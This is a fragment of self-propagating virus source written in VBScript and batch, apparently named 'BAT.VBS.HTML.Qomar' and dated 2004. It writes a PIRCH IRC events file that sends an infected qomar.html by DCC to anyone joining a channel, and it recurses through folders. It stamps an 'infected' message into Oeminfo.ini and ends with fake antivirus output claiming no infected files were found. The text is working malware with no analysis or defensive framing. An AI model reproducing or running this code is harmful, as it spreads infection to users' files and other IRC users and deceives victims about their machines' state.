'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level5=400-Level 400 "
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "400-Level 400Enabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level6=500-Level 500"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "500-Level 500Enabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[000-Unknowns]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[100-Level 100]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "User1=*!*@*"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Event1=ON JOIN:#:/dcc tsend $nick C:\windows\qomar.html"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[200-Level 200]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[300-Level 300]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[400-Level 400]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine ""
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[500-Level 500]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "UserCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "EventCount=0"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.Close
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
End if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
next
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set Subfolders = folder.SubFolders 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
For Each Subfolder in Subfolders 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Dosearch Subfolder.path 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Next 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end function
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
:end
@echo [General]>>C:\Windows\system\Oeminfo.ini
@echo Manufacturer="VIRUS INFORMATION">>C:\Windows\system\Oeminfo.ini
@echo Model="BAT.VBS.HTML ~ PIRCH Qomar by sevenC">>C:\Windows\system\Oeminfo.ini
@echo [Support Information]>>C:\Windows\system\Oeminfo.ini
@echo Line1="BAT.VBS.HTML.Qomar Information">>C:\Windows\system\Oeminfo.ini
@echo Line2="*********************************">>C:\Windows\system\Oeminfo.ini
@echo Line3="Your computer has been infected with my virus">>C:\Windows\system\Oeminfo.ini
@echo Line4="Please Don't be sad">>C:\Windows\system\Oeminfo.ini
@echo Line5="Coz I just infect BAT,VBE,VBS html,htm,asp & php files">>C:\Windows\system\Oeminfo.ini
@echo Line6="I think you don't need that files don't you ??">>C:\Windows\system\Oeminfo.ini
@echo Line7="********************************************************************">>C:\Windows\system\Oeminfo.ini
@echo Line8="BAT.VBS.HTML.Qomar By sevenC">>C:\Windows\system\Oeminfo.ini
@echo Line9="Created on friday 23th January 2004">>C:\Windows\system\Oeminfo.ini
@echo Line10="-Bekasi.Indonesia-">>C:\Windows\system\Oeminfo.ini
Echo Finished scaning MBR.
Echo No Infected files found.
Echo Copyright(c)2004 by Qomarudin-AntiVirus
@exit
